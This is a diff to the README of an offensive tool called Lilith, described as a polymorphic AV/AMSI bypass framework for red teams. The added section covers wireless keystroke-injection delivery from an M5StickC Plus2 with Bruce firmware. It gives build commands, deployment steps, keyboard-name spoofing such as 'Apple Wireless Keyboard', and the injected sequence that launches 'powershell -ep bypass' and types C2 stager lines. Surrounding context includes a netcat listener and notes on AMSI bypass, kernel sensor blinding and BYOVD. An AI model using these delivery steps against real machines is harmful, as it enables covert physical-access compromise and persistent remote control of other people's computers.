@@ -11,7 +11,7 @@
 ---
 
 Lilith is a polymorphic AV/AMSI bypass framework for authorized red team engagements.  
-It builds a randomized C runner, encodes offensive .NET tools, generates PowerShell stagers, and serves everything over a fake IIS HTTPS server — with a complete SYSTEM escalation chain, interactive C2, process migration, kernel sensor blinding, registry persistence, and USB HID physical-access delivery built in.
+It builds a randomized C runner, encodes offensive .NET tools, generates PowerShell stagers, and serves everything over a fake IIS HTTPS server — with a complete SYSTEM escalation chain, interactive C2, process migration, kernel sensor blinding, registry persistence, USB HID physical-access delivery, and BLE HID delivery via M5StickC Plus2 / Bruce firmware built in.
 
 ---
 
@@ -341,7 +341,7 @@ Run the exact 10 lines printed by `build --stager`. Values are random per build:
 ──── L02 ─── invisible-Unicode setup (SslStream, MemoryStream, ScriptBlock type names)
 ──── L03 ─── shared XOR key + decoder + PSObject.Assembly ref + SBL bypass + AMSI bypass
 ──── L04 ─── XOR-decode stager URL, parse URI components
-──── L05 ─── proxy detection via Net.WebClient + Windows integrated auth
+──── L05 ─── proxy detection via GetSystemWebProxy() + Windows integrated auth
 ──── L06 ─── TCP connect to target (direct or via proxy)
 ──── L07 ─── HTTP CONNECT tunnel (only runs when proxy detected)
 ──── L08 ─── SslStream + TLS auth + GET request (verb XOR-decoded at runtime)
@@ -421,6 +421,75 @@ Output goes to `~/.lilith/usb/` by default.
 # 3. Copy adafruit_hid/ folder to /lib on the Pico drive
 # 4. Copy code.py to / on the Pico drive
 ```
+
+---
+
+## BLE HID delivery (`--ble`)
+
+Wireless physical-access scenario — pair the device once, trigger from up to 10m away. No USB cable on the target. Generates a DuckyScript payload for **Bruce firmware** or an Arduino sketch for a **custom M5StickC Plus2** build.
+
+### Bruce firmware (recommended — no compile step)
+
+```bash
+# C2 agent stager (bare --ble defaults to C2 agent)
+python3 lilith.py build --c2-stager --ble --ble-device bruce
+
+# Named tool stager
+python3 lilith.py build --ble SharpUp --ble-device bruce
+
+# Custom BLE device name (set in Bruce settings menu on the device itself)
+python3 lilith.py build --ble --ble-device bruce --ble-name "Logitech MX Keys"
+
+# Output directory
+python3 lilith.py build --ble --ble-device bruce --ble-out /tmp/payload/
+```
+
+Output: `<workspace>/ble/lilith.txt`
+
+**Deploy:**
+1. Copy `lilith.txt` to SD card at `/BadBLE/lilith.txt`
+2. Power on M5StickC Plus2 near target
+3. Target pairs once: Bluetooth → Add device → select the BLE keyboard name
+4. Bruce menu → **BadBLE** → `lilith.txt` → run
+5. Session registers in ~30s
+
+**Execution sequence (Bruce):**
+1. `WIN+R` → `powershell -ep bypass` → Enter
+2. Wait for PowerShell cold-start (~1.8s)
+3. Type each of the 10 stager lines individually — one `STRING + ENTER` per line
+4. Wait for stager to launch background process (~2.5s)
+5. Type `exit` → Enter
+
+> Bruce types via BLE HID byte-by-byte. The payload is stripped to pure ASCII before embedding — ZWSP invisible Unicode chars used in other delivery modes cannot be transmitted reliably via BLE HID (multi-byte UTF-8 sequences fragment into garbage keystrokes).
+
+### M5StickC Plus2 custom sketch
+
+```bash
+python3 lilith.py build --ble --ble-device m5stick --ble-name "Apple Wireless Keyboard"
+# Output: <workspace>/ble/lilith_ble/lilith_ble.ino
+```
+
+**Requirements (Arduino IDE):**
+- Board manager URL: `https://m5stack.oss-cn-shenzhen.aliyuncs.com/resource/arduino/package_m5stack_index.json`
+- Board: M5StickC Plus2
+- Library: **ESP32 BLE Keyboard** by T-vK (Library Manager)
+- Library: **M5StickCPlus2** (Library Manager)
+
+**Device UI:**
+- Yellow screen: waiting for BLE pairing
+- Green screen "READY / A = fire": paired and armed
+- Button A: injects payload
+- Button B: re-arms without re-pairing
+- Green screen "DONE": injection complete, session expected in ~30s
+
+### BLE HID flags
+
+| Flag | Default | Description |
+|---|---|---|
+| `--ble [TOOL]` | — | Tool name, or bare `--ble` for C2 agent stager |
+| `--ble-device TYPE` | `m5stick` | `m5stick` / `bruce` / `all` |
+| `--ble-out DIR` | `<workspace>/ble/` | Output directory |
+| `--ble-name NAME` | `Apple Wireless Keyboard` | BLE advertisement name (m5stick only — Bruce uses its own settings) |
 
 ---
 
@@ -676,6 +745,10 @@ nc -lvnp 5555 &
 python3 lilith.py build --usb SharpUp           # all devices
 python3 lilith.py build --usb SharpUp --usb-device pico --usb-boot-delay 3000
 
+# 6b. BLE HID payloads (wireless physical access — M5StickC Plus2 / Bruce)
+python3 lilith.py build --c2-stager --ble --ble-device bruce
+python3 lilith.py build --ble SharpUp --ble-device all
+
 # 7. Start server
 python3 lilith.py serve
 
@@ -756,6 +829,7 @@ All build output goes to `~/.lilith/` by default (or `$WORKSPACE/lilith/` if set
 | `server.crt` / `server.key` | Auto-generated TLS certificate |
 | `byovd.exe` / `byovd.enc` | BYOVD kit (only if `--byovd` was run) |
 | `usb/` | USB HID payload files (only if `--usb` was run) |
+| `ble/` | BLE HID payload files (only if `--ble` was run) |
 
 ---
 
@@ -768,6 +842,7 @@ All build output goes to `~/.lilith/` by default (or `$WORKSPACE/lilith/` if set
 | EPROCESS offsets | UniqueProcessId=0x2E8, Links=0x2F0, Protection=0x87A valid on Win10 20H2 – Win11 23H2 x64 only |
 | BYOVD | Requires driver `.sys` on disk + admin/SYSTEM; HVCI blocks kernel writes entirely |
 | USB HID | US keyboard layout only — non-US hosts mistype `$`, `{`, `@` etc. |
+| BLE HID | Requires one-time pairing on target; pairing event logged in Windows Bluetooth event log; ZWSP obfuscation stripped (BLE HID cannot transmit non-ASCII) |
 | Watchdog depth | One backup per primary; can produce several sessions on targets with many accessible processes |
 
 ---
